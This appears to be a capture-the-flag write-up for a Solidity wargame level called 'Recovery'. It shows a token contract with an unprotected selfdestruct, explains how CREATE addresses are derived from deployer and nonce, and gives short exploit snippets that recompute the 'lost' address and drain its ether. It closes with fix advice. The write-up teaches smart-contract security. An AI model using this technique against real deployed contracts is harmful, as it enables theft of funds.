# Level 17: Recovery

## Goal

A factory created a token contract and sent it 0.001 ether, but the token's address was "lost." Recover the ether.

## The contracts

```solidity
contract Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

## Vulnerability

The token contract exposes a public, unprotected `destroy` that `selfdestruct`s to any address. And its address is not really lost: a contract created with `CREATE` has a **deterministic** address derived from the deployer and its nonce:

`address = keccak256(rlp([deployer, nonce]))[12:]`

For the first contract Recovery deploys, nonce = 1.

## Exploit

Option A - compute the address:

```solidity
address lost = address(uint160(uint256(keccak256(
    abi.encodePacked(bytes1(0xd6), bytes1(0x94), recoveryAddress, bytes1(0x01))
))));
```

(`0xd6, 0x94` are the RLP prefixes for [20-byte address, nonce 1].)

Option B - just look up the internal contract-creation transaction on Etherscan for the Recovery address.

Then recover the ether:

```js
// call destroy on the recovered token address, sending funds to yourself
await tokenAtLostAddress.destroy(player);
```

## Fix

- Never rely on a contract address being "hidden"; `CREATE`/`CREATE2` addresses are deterministic and derivable.
- Do not expose an unprotected `selfdestruct`; guard destructive functions with access control.

## Takeaway

Contract addresses are predictable (CREATE from deployer+nonce, CREATE2 from salt+initcode). "Losing" an address hides nothing, and unprotected `selfdestruct` is a critical bug.
